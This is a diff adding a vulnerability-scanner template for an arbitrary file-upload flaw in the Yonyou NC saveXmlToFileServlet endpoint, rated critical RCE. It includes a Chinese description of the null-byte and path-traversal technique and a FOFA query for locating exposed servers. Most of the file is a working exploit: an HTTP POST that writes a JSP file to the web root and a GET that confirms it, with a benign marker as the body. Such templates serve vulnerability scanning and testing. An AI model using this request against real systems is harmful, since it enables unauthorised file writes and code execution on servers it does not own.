@@ -1,0 +1,39 @@
+## id: VEID-2024-0506
+## name: 用友NC接口saveXmlToFIleServlet存在文件上传
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: /portal/pt/servlet/saveXmlToFileServlet/doPost接口会保存xml文档到服务器一个路径下，默认会添加.xml后缀，通过Windows的文件名特性可截断.xml文件后缀。再通过目录穿越可上传jsp文件到nc_web目录下。
+## fofa-query: title:"YONYOU NC"
+## verification: true
+
+
+
+POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=a.jsp%00 HTTP/1.1
+Host: {{Hostname}}
+Cookie: LA_K1=langid
+serverEnable: localserver
+Accept-Encoding: gzip, x-gzip, deflate
+Content-Length: 27
+Content-Type: application/octet-stream
+Content-Encoding: UTF_8
+Connection: keep-alive
+User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
+
+hello veil
+
+#@ matcher: body contains "hello veil"
+
+---
+
+GET /portal/processxml/a.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: ea48c4da856d1e271b308db8a642c515bb66be10ebb898ebe49c1a7be161dd59
